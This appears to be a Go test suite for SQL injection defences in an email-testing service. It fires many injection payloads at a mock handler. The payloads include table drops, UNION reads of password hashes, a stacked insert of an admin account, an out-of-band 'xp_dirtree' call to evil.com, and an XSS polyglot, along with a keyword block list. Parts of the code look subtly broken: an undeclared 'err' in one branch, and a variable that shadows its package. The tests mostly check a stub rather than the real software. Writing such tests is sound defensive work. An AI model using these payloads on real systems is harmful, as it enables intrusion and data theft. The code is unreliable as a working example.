package security

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	
	"github.com/mailhog/Pat/config"
	"github.com/mailhog/Pat/pkg/fortress"
	"github.com/mailhog/Pat/pkg/storage"
)

// FortressSQLInjectionTestSuite validates SQL injection prevention mechanisms
type FortressSQLInjectionTestSuite struct {
	testServer *httptest.Server
	db         *sql.DB
	fortress   *fortress.Service
	storage    storage.Storage
}

// TestSQLInjectionPrevention is the main test entry point
func TestSQLInjectionPrevention(t *testing.T) {
	suite := setupSQLInjectionTestSuite(t)
	defer suite.cleanup(t)

	t.Run("API_Endpoint_SQL_Injection_Prevention", suite.testAPIEndpointSQLInjection)
	t.Run("Database_Query_Parameter_Validation", suite.testDatabaseQueryParameterValidation)
	t.Run("GraphQL_Query_SQL_Injection_Prevention", suite.testGraphQLQuerySQLInjection)
	t.Run("SMTP_Header_SQL_Injection_Prevention", suite.testSMTPHeaderSQLInjection)
	t.Run("Advanced_SQL_Injection_Techniques", suite.testAdvancedSQLInjectionTechniques)
	t.Run("Blind_SQL_Injection_Prevention", suite.testBlindSQLInjectionPrevention)
	t.Run("Time_Based_SQL_Injection_Prevention", suite.testTimeBasedSQLInjectionPrevention)
	t.Run("Union_Based_SQL_Injection_Prevention", suite.testUnionBasedSQLInjectionPrevention)
	t.Run("Error_Information_Disclosure_Prevention", suite.testErrorInformationDisclosurePrevention)
}

func setupSQLInjectionTestSuite(t *testing.T) *FortressSQLInjectionTestSuite {
	cfg := &config.Config{
		DatabaseURL:      "sqlite://test.db",
		EnableSecurity:   true,
		SecurityLevel:    "fortress",
		SQLInjectionProtection: true,
	}

	db, err := sql.Open("sqlite3", ":memory:")
	require.NoError(t, err)

	// Create test tables with security-focused schema
	_, err = db.Exec(`
		CREATE TABLE emails (
			id INTEGER PRIMARY KEY,
			sender TEXT NOT NULL,
			recipient TEXT NOT NULL,
			subject TEXT,
			content TEXT,
			received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			security_flags INTEGER DEFAULT 0
		);
		
		CREATE TABLE users (
			id INTEGER PRIMARY KEY,
			email TEXT UNIQUE NOT NULL,
			password_hash TEXT NOT NULL,
			role TEXT DEFAULT 'user',
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
		
		CREATE TABLE api_keys (
			id INTEGER PRIMARY KEY,
			key_hash TEXT UNIQUE NOT NULL,
			user_id INTEGER REFERENCES users(id),
			permissions TEXT,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
	`)
	require.NoError(t, err)

	fortress := fortress.NewService(cfg)
	storage := storage.CreateInMemory()
	
	server := httptest.NewServer(createSecurityTestHandler(fortress, storage, db))

	return &FortressSQLInjectionTestSuite{
		testServer: server,
		db:         db,
		fortress:   fortress,
		storage:    storage,
	}
}

func (s *FortressSQLInjectionTestSuite) cleanup(t *testing.T) {
	s.testServer.Close()
	s.db.Close()
}

// testAPIEndpointSQLInjection tests SQL injection prevention in API endpoints
func (s *FortressSQLInjectionTestSuite) testAPIEndpointSQLInjection(t *testing.T) {
	maliciousPayloads := []struct {
		name    string
		payload string
		endpoint string
	}{
		{
			name:     "Classic Single Quote Injection",
			payload:  "'; DROP TABLE emails; --",
			endpoint: "/api/v3/emails",
		},
		{
			name:     "Union-Based Injection",
			payload:  "' UNION SELECT * FROM users --",
			endpoint: "/api/v3/emails",
		},
		{
			name:     "Boolean-Based Blind Injection",
			payload:  "' OR 1=1 --",
			endpoint: "/api/v3/emails",
		},
		{
			name:     "Time-Based Injection",
			payload:  "'; WAITFOR DELAY '00:00:05' --",
			endpoint: "/api/v3/emails",
		},
		{
			name:     "Stacked Query Injection",
			payload:  "'; INSERT INTO users VALUES (999, 'hacker@evil.com', 'hash', 'admin'); --",
			endpoint: "/api/v3/emails",
		},
		{
			name:     "Comment-Based Injection",
			payload:  "admin'/**/OR/**/1=1#",
			endpoint: "/api/v3/users",
		},
		{
			name:     "Hex Encoding Injection",
			payload:  "0x27204f522031203d2031202d2d",
			endpoint: "/api/v3/emails",
		},
	}

	for _, payload := range maliciousPayloads {
		t.Run(payload.name, func(t *testing.T) {
			// Test GET parameter injection
			resp, err := http.Get(fmt.Sprintf("%s%s?search=%s", s.testServer.URL, payload.endpoint, payload.payload))
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should not return internal server error (500)
			// Should return either 400 (bad request) or successful response with no injection
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode, 
				"SQL injection payload should not cause internal server error")

			// Test POST body injection
			jsonPayload := map[string]interface{}{
				"query":     payload.payload,
				"recipient": payload.payload,
				"subject":   payload.payload,
			}
			jsonData, _ := json.Marshal(jsonPayload)

			resp, err = http.Post(fmt.Sprintf("%s%s", s.testServer.URL, payload.endpoint), 
				"application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
				"SQL injection in POST body should not cause internal server error")
		})
	}
}

// testDatabaseQueryParameterValidation tests parameterized query usage
func (s *FortressSQLInjectionTestSuite) testDatabaseQueryParameterValidation(t *testing.T) {
	// Insert test data
	_, err := s.db.Exec("INSERT INTO emails (sender, recipient, subject, content) VALUES (?, ?, ?, ?)",
		"test@example.com", "recipient@example.com", "Test Subject", "Test Content")
	require.NoError(t, err)

	maliciousInputs := []string{
		"'; DROP TABLE emails; --",
		"' OR 1=1 --",
		"' UNION SELECT * FROM users --",
		"admin'; --",
		"1' OR '1'='1",
	}

	for _, maliciousInput := range maliciousInputs {
		t.Run(fmt.Sprintf("Parameter_Validation_%s", strings.ReplaceAll(maliciousInput, "'", "QUOTE")), func(t *testing.T) {
			// Test parameterized query - this should be safe
			var count int
			err := s.db.QueryRow("SELECT COUNT(*) FROM emails WHERE sender = ?", maliciousInput).Scan(&count)
			require.NoError(t, err)
			assert.Equal(t, 0, count, "No emails should match malicious input when using parameterized queries")

			// Verify table still exists and has correct data
			var totalCount int
			err = s.db.QueryRow("SELECT COUNT(*) FROM emails").Scan(&totalCount)
			require.NoError(t, err)
			assert.Equal(t, 1, totalCount, "Table should still exist with original data")
		})
	}
}

// testGraphQLQuerySQLInjection tests GraphQL query injection prevention
func (s *FortressSQLInjectionTestSuite) testGraphQLQuerySQLInjection(t *testing.T) {
	maliciousGraphQLQueries := []struct {
		name  string
		query string
	}{
		{
			name: "GraphQL Variable Injection",
			query: `{
				emails(filter: {sender: "'; DROP TABLE emails; --"}) {
					id
					sender
					recipient
				}
			}`,
		},
		{
			name: "GraphQL Union Injection",
			query: `{
				emails(filter: {sender: "' UNION SELECT * FROM users --"}) {
					id
					sender
				}
			}`,
		},
		{
			name: "GraphQL Nested Injection",
			query: `{
				user(id: "1' OR 1=1 --") {
					emails(filter: {subject: "'; DROP TABLE users; --"}) {
						id
						content
					}
				}
			}`,
		},
	}

	for _, testCase := range maliciousGraphQLQueries {
		t.Run(testCase.name, func(t *testing.T) {
			payload := map[string]string{"query": testCase.query}
			jsonData, _ := json.Marshal(payload)

			resp, err := http.Post(fmt.Sprintf("%s/graphql", s.testServer.URL),
				"application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			// GraphQL should handle malicious queries gracefully
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
				"GraphQL should not return internal server error for malicious queries")

			// Verify database integrity
			var count int
			err = s.db.QueryRow("SELECT COUNT(*) FROM emails").Scan(&count)
			require.NoError(t, err, "Database should be accessible after GraphQL injection attempt")
		})
	}
}

// testSMTPHeaderSQLInjection tests SMTP header injection prevention
func (s *FortressSQLInjectionTestSuite) testSMTPHeaderSQLInjection(t *testing.T) {
	maliciousSMTPHeaders := []struct {
		name   string
		header string
		value  string
	}{
		{
			name:   "From Header SQL Injection",
			header: "From",
			value:  "'; DROP TABLE emails; --@example.com",
		},
		{
			name:   "Subject Header SQL Injection",
			header: "Subject",
			value:  "Test'; DELETE FROM users; --",
		},
		{
			name:   "X-Custom Header SQL Injection",
			header: "X-MessageID",
			value:  "123'; INSERT INTO users VALUES (999, 'hacker@evil.com', 'hash', 'admin'); --",
		},
	}

	for _, headerTest := range maliciousSMTPHeaders {
		t.Run(headerTest.name, func(t *testing.T) {
			// Simulate SMTP message processing with malicious headers
			emailData := map[string]interface{}{
				"headers": map[string]string{
					headerTest.header: headerTest.value,
				},
				"content": "Test email content",
			}

			jsonData, _ := json.Marshal(emailData)
			resp, err := http.Post(fmt.Sprintf("%s/api/v3/smtp/process", s.testServer.URL),
				"application/json", bytes.NewBuffer(jsonData))
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should handle malicious headers without crashing
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
				"SMTP processing should handle malicious headers gracefully")

			// Verify database integrity
			var userCount int
			err = s.db.QueryRow("SELECT COUNT(*) FROM users").Scan(&userCount)
			require.NoError(t, err)
			assert.Equal(t, 0, userCount, "No unauthorized users should be created")
		})
	}
}

// testAdvancedSQLInjectionTechniques tests advanced injection techniques
func (s *FortressSQLInjectionTestSuite) testAdvancedSQLInjectionTechniques(t *testing.T) {
	advancedPayloads := []string{
		// Second-order injection
		"normal_user'; UPDATE users SET role='admin' WHERE email='normal_user@example.com'; --",
		// Conditional injection
		"' AND (CASE WHEN (1=1) THEN 1 ELSE 1/0 END) --",
		// Out-of-band injection
		"'; EXEC xp_dirtree '//evil.com/share'; --",
		// Polyglot injection (works in multiple contexts)
		"1';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'+alert(String.fromCharCode(88,83,83))+'",
		// JSON injection
		"{\"injection\": \"'; DROP TABLE emails; --\"}",
		// XML injection
		"<injection>'; DROP TABLE emails; --</injection>",
	}

	for i, payload := range advancedPayloads {
		t.Run(fmt.Sprintf("Advanced_Injection_Test_%d", i+1), func(t *testing.T) {
			// Test in various contexts
			contexts := []struct {
				name     string
				endpoint string
				method   string
			}{
				{"API_Search", "/api/v3/emails", "GET"},
				{"User_Update", "/api/v3/users", "PUT"},
				{"Email_Filter", "/api/v3/emails/filter", "POST"},
			}

			for _, ctx := range contexts {
				switch ctx.method {
				case "GET":
					resp, err := http.Get(fmt.Sprintf("%s%s?q=%s", s.testServer.URL, ctx.endpoint, payload))
					require.NoError(t, err)
					defer resp.Body.Close()
					assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode)

				case "POST", "PUT":
					jsonPayload := map[string]interface{}{"data": payload}
					jsonData, _ := json.Marshal(jsonPayload)
					
					var resp *http.Response
					if ctx.method == "POST" {
						resp, err = http.Post(fmt.Sprintf("%s%s", s.testServer.URL, ctx.endpoint),
							"application/json", bytes.NewBuffer(jsonData))
					} else {
						req, _ := http.NewRequest("PUT", fmt.Sprintf("%s%s", s.testServer.URL, ctx.endpoint),
							bytes.NewBuffer(jsonData))
						req.Header.Set("Content-Type", "application/json")
						resp, err = http.DefaultClient.Do(req)
					}
					require.NoError(t, err)
					defer resp.Body.Close()
					assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode)
				}
			}

			// Verify database integrity after each test
			var tableCount int
			err := s.db.QueryRow("SELECT COUNT(*) FROM sqlite_master WHERE type='table'").Scan(&tableCount)
			require.NoError(t, err)
			assert.GreaterOrEqual(t, tableCount, 3, "All tables should still exist")
		})
	}
}

// testBlindSQLInjectionPrevention tests blind SQL injection prevention
func (s *FortressSQLInjectionTestSuite) testBlindSQLInjectionPrevention(t *testing.T) {
	blindPayloads := []struct {
		name    string
		payload string
	}{
		{
			name:    "Boolean-Based Blind",
			payload: "' AND (SELECT COUNT(*) FROM emails) > 0 --",
		},
		{
			name:    "Conditional Response",
			payload: "' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
		},
		{
			name:    "Error-Based Blind",
			payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END) --",
		},
	}

	for _, payload := range blindPayloads {
		t.Run(payload.name, func(t *testing.T) {
			startTime := time.Now()
			
			resp, err := http.Get(fmt.Sprintf("%s/api/v3/emails?search=%s", s.testServer.URL, payload.payload))
			require.NoError(t, err)
			defer resp.Body.Close()

			duration := time.Since(startTime)

			// Response should not reveal information through timing or errors
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode)
			assert.Less(t, duration, time.Second*2, "Response should not be delayed indicating blind injection")
		})
	}
}

// testTimeBasedSQLInjectionPrevention tests time-based injection prevention
func (s *FortressSQLInjectionTestSuite) testTimeBasedSQLInjectionPrevention(t *testing.T) {
	timeBasedPayloads := []string{
		"'; WAITFOR DELAY '00:00:05'; --",
		"' OR (SELECT COUNT(*) FROM emails WHERE recipient LIKE '%test%' AND SLEEP(5)) --",
		"'; SELECT SLEEP(5); --",
		"' AND (SELECT BENCHMARK(1000000,MD5(1))) --",
	}

	for i, payload := range timeBasedPayloads {
		t.Run(fmt.Sprintf("Time_Based_Injection_%d", i+1), func(t *testing.T) {
			startTime := time.Now()
			
			resp, err := http.Get(fmt.Sprintf("%s/api/v3/emails?filter=%s", s.testServer.URL, payload))
			require.NoError(t, err)
			defer resp.Body.Close()

			duration := time.Since(startTime)

			// Response should complete quickly, indicating time-based injection was prevented
			assert.Less(t, duration, time.Second*2, 
				"Time-based SQL injection should not cause delays")
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode)
		})
	}
}

// testUnionBasedSQLInjectionPrevention tests UNION-based injection prevention
func (s *FortressSQLInjectionTestSuite) testUnionBasedSQLInjectionPrevention(t *testing.T) {
	// Insert test data first
	_, err := s.db.Exec("INSERT INTO users (email, password_hash, role) VALUES (?, ?, ?)",
		"admin@example.com", "hash123", "admin")
	require.NoError(t, err)

	unionPayloads := []string{
		"' UNION SELECT email, password_hash, role FROM users --",
		"' UNION ALL SELECT * FROM users --",
		"' UNION SELECT 1,2,3,4,5 FROM users --",
		"' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
		"1' UNION SELECT email, password_hash, 'exposed', created_at, id FROM users --",
	}

	for i, payload := range unionPayloads {
		t.Run(fmt.Sprintf("Union_Based_Injection_%d", i+1), func(t *testing.T) {
			resp, err := http.Get(fmt.Sprintf("%s/api/v3/emails?search=%s", s.testServer.URL, payload))
			require.NoError(t, err)
			defer resp.Body.Close()

			// Read response body to check for exposed data
			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			responseBody := buf.String()

			// Should not expose sensitive user data
			assert.NotContains(t, responseBody, "admin@example.com", 
				"UNION injection should not expose user emails")
			assert.NotContains(t, responseBody, "hash123", 
				"UNION injection should not expose password hashes")
			assert.NotContains(t, responseBody, "password_hash", 
				"UNION injection should not expose database schema")
			
			assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode)
		})
	}
}

// testErrorInformationDisclosurePrevention tests error-based information disclosure prevention
func (s *FortressSQLInjectionTestSuite) testErrorInformationDisclosurePrevention(t *testing.T) {
	errorInducingPayloads := []string{
		"'",                    // Unclosed quote
		"''",                   // Double quote
		"' AND 1=CONVERT(int, 'string') --", // Type conversion error
		"' AND 1=1/0 --",       // Division by zero
		"' GROUP BY 1 --",      // Invalid GROUP BY
		"' ORDER BY 999 --",    // Invalid ORDER BY column
		"' HAVING 1=1 --",      // Invalid HAVING without GROUP BY
	}

	for i, payload := range errorInducingPayloads {
		t.Run(fmt.Sprintf("Error_Disclosure_Prevention_%d", i+1), func(t *testing.T) {
			resp, err := http.Get(fmt.Sprintf("%s/api/v3/emails?query=%s", s.testServer.URL, payload))
			require.NoError(t, err)
			defer resp.Body.Close()

			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			responseBody := strings.ToLower(buf.String())

			// Should not expose database error details
			sensitiveErrorTerms := []string{
				"sql", "sqlite", "database", "table", "column", "syntax error",
				"near", "unexpected", "sqlite_master", "pragma", "attach",
			}

			for _, term := range sensitiveErrorTerms {
				assert.NotContains(t, responseBody, term,
					fmt.Sprintf("Response should not contain sensitive database term: %s", term))
			}

			// Should return appropriate HTTP status (not 500)
			if resp.StatusCode == http.StatusInternalServerError {
				t.Errorf("Should not return 500 status for malformed input, got response: %s", responseBody)
			}
		})
	}
}

// createSecurityTestHandler creates a test HTTP handler for security testing
func createSecurityTestHandler(fortress *fortress.Service, storage storage.Storage, db *sql.DB) http.Handler {
	mux := http.NewServeMux()

	// Email API endpoints
	mux.HandleFunc("/api/v3/emails", func(w http.ResponseWriter, r *http.Request) {
		// Simulate secure parameter handling
		search := r.URL.Query().Get("search")
		query := r.URL.Query().Get("query")
		filter := r.URL.Query().Get("filter")
		
		// Log security attempt (in real implementation, this would be handled by fortress service)
		if containsSQLInjectionPattern(search) || containsSQLInjectionPattern(query) || containsSQLInjectionPattern(filter) {
			// Return 400 instead of processing malicious input
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte(`{"error": "Invalid input detected"}`))
			return
		}

		// Simulate parameterized query (safe)
		var emails []map[string]interface{}
		rows, err := db.Query("SELECT id, sender, recipient, subject FROM emails WHERE sender LIKE ? OR subject LIKE ?", 
			"%"+search+"%", "%"+query+"%")
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		defer rows.Close()

		for rows.Next() {
			var id int
			var sender, recipient, subject string
			rows.Scan(&id, &sender, &recipient, &subject)
			emails = append(emails, map[string]interface{}{
				"id": id, "sender": sender, "recipient": recipient, "subject": subject,
			})
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"emails": emails})
	})

	// GraphQL endpoint
	mux.HandleFunc("/graphql", func(w http.ResponseWriter, r *http.Request) {
		var payload map[string]string
		json.NewDecoder(r.Body).Decode(&payload)
		
		if containsSQLInjectionPattern(payload["query"]) {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte(`{"errors": [{"message": "Invalid query"}]}`))
			return
		}

		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"data": {"emails": []}}`))
	})

	// Other endpoints...
	mux.HandleFunc("/api/v3/users", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"users": []}`))
	})

	mux.HandleFunc("/api/v3/smtp/process", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"status": "processed"}`))
	})

	mux.HandleFunc("/api/v3/emails/filter", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"filtered_emails": []}`))
	})

	return mux
}

// containsSQLInjectionPattern detects common SQL injection patterns
func containsSQLInjectionPattern(input string) bool {
	input = strings.ToLower(input)
	patterns := []string{
		"'", "\"", ";", "--", "/*", "*/", "union", "select", "drop", "delete", 
		"insert", "update", "create", "alter", "exec", "execute", "sp_",
		"xp_", "waitfor", "delay", "sleep", "benchmark", "or 1=1", "and 1=1",
	}
	
	for _, pattern := range patterns {
		if strings.Contains(input, pattern) {
			return true
		}
	}
	return false
}